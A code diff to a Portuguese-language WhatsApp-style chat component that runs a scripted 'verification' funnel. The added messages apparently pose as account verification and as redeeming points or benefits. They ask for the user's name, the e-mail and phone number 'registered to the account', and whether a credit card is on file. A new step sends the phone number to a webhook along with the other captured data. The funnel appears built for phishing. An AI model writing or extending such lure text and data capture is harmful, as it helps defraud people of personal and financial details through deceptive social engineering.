@@ -49,25 +49,25 @@ const FUNNEL_FLOW: {
 }[] = [
     {
       step: 0,
-      message: "Olá, para continuarmos precisamos verificar alguns dados antes",
+      message: "Olá, para continuarmos precisamos verificar somente seu cadastro 💜",
       type: "text",
       delay: 1000,
     },
     {
       step: 1,
-      message: "Para começar, qual o seu nome?",
+      message: "Para começar informe somente, qual o seu nome? ",
       type: "text",
       delay: 1500,
     },
     {
       step: 19,
-      message: "Agora precisamos confirmar qual o e-mail cadastrado na conta",
+      message: "Agora confirme somente o NÚMERO e o E-MAIL cadastrado à conta (NÃO É NECESSÁRIO INFORMAR A SENHA)\n`Envie primeiro o e-mail, depois o número`",
       type: "text",
       delay: 1200,
     },
     {
       step: 20,
-      message: "Você está com o cartão de crédito habilitado em sua conta?",
+      message: "e como última validação, para RESGATE DE SEUS PONTOS/BENEFÍCIOS, só nos CONFIRME SE POSSUI CARTÃO DE CRÉDITO cadastrado conosco:",
       type: "options",
       options: ["SIM", "NÃO"],
       delay: 1200,
@@ -89,6 +89,7 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
   const [isTyping, setIsTyping] = useState(false);
   const [inputValue, setInputValue] = useState("");
   const [waitingForEmail, setWaitingForEmail] = useState(false);
+  const [waitingForPhone, setWaitingForPhone] = useState(false);
   const [waitingForName, setWaitingForName] = useState(false);
   const [showCheckoutCard, setShowCheckoutCard] = useState(false);
   const [funnelData, setFunnelData] = useState<Record<string, unknown>>({});
@@ -311,6 +312,7 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
     // Reset waiting states when selecting an option to avoid overlapping input handlers
     setWaitingForName(false);
     setWaitingForEmail(false);
+    setWaitingForPhone(false);
     setInputValue("");
 
     // Find next step
@@ -401,12 +403,44 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
       ...funnelDataRef.current
     });
 
+    // Instead of advancing to Step 20, wait for phone
+    setWaitingForPhone(true);
+  };
+
+  const handlePhoneSubmit = () => {
+    if (!inputValue.trim()) return;
+
+    const phone = inputValue.trim();
+
+    // Add user message
+    const userMessage: Message = {
+      id: Date.now().toString(),
+      type: "text",
+      content: phone,
+      sender: "user",
+      timestamp: new Date().toLocaleTimeString("pt-BR", {
+        hour: "2-digit",
+        minute: "2-digit",
+      }),
+    };
+    setMessages((prev) => [...prev, userMessage]);
+    setInputValue("");
+    setWaitingForPhone(false);
+
+    // Update funnel data
+    const newData = { phone };
+    funnelDataRef.current = { ...funnelDataRef.current, ...newData };
+    setFunnelData(funnelDataRef.current);
+
+    // Send incremental webhook
+    sendToWebhook({
+      event: "phone_captured",
+      ...funnelDataRef.current
+    });
+
     // Advance to next step (Credit Card question)
     setTimeout(() => {
-      if (currentStep === 19) {
-        processStep(20);
-        return;
-      }
+      processStep(20);
     }, 1200);
   };
 
@@ -423,7 +457,12 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
   };
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setInputValue(e.target.value);
+    const value = e.target.value;
+    if (waitingForPhone) {
+      setInputValue(formatPhone(value));
+    } else {
+      setInputValue(value);
+    }
   };
 
   const toggleAudio = (audioUrl: string) => {
@@ -601,7 +640,7 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
                 ) : (
                   <>
                     <div className="text-sm whitespace-pre-line">
-                      {message.content.split(/(\*\*\[.+?\]\(.+?\)\*\*|\[.+?\]\(.+?\)|https?:\/\/[^\s]+|\*[^*]+\*)/g).map((part, i) => {
+                      {message.content.split(/(\*\*\[.+?\]\(.+?\)\*\*|\[.+?\]\(.+?\)|https?:\/\/[^\s]+|\*[^*]+\*|`[^`]+`)/g).map((part, i) => {
                         const mdLinkMatch = part.match(/\**\[(.+?)\]\((.+?)\)\**/);
                         if (mdLinkMatch) {
                           return (
@@ -633,6 +672,10 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
                         const boldMatch = part.match(/^\*(.+?)\*$/);
                         if (boldMatch) {
                           return <strong key={i} className="font-bold">{boldMatch[1]}</strong>;
+                        }
+                        const codeMatch = part.match(/^`(.+?)`$/);
+                        if (codeMatch) {
+                          return <code key={i} className="font-mono bg-white/5 px-1.5 py-0.5 rounded text-[11px] text-white/80 border border-white/5">{codeMatch[1]}</code>;
                         }
                         return part;
                       })}
@@ -787,11 +830,12 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
             type="text"
             value={inputValue}
             onChange={handleInputChange}
-            inputMode={waitingForEmail ? "email" : "text"}
+            inputMode={waitingForEmail ? "email" : waitingForPhone ? "tel" : "text"}
             onKeyDown={(e) => {
               if (e.key === "Enter") {
                 if (waitingForName) handleNameSubmit();
                 if (waitingForEmail) handleEmailSubmit();
+                if (waitingForPhone) handlePhoneSubmit();
               }
             }}
             placeholder={
@@ -799,9 +843,11 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
                 ? "Como devo te chamar?"
                 : waitingForEmail
                   ? "Digite seu e-mail..."
-                  : "Selecione uma opcao acima"
+                  : waitingForPhone
+                    ? "Digite seu número..."
+                    : "Selecione uma opcao acima"
             }
-            disabled={!waitingForEmail && !waitingForName}
+            disabled={!waitingForEmail && !waitingForName && !waitingForPhone}
             className="flex-1 bg-transparent text-white placeholder-white/40 outline-none text-sm"
           />
           <button
@@ -818,12 +864,14 @@ export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
           </button>
         </div>
 
-        {(waitingForEmail || waitingForName) && inputValue ? (
+        {(waitingForEmail || waitingForName || waitingForPhone) && inputValue ? (
           <button
             onClick={
               waitingForName
                 ? handleNameSubmit
-                : handleEmailSubmit
+                : waitingForEmail
+                  ? handleEmailSubmit
+                  : handlePhoneSubmit
             }
             className="w-12 h-12 rounded-full bg-[#25D366] flex items-center justify-center"
           >
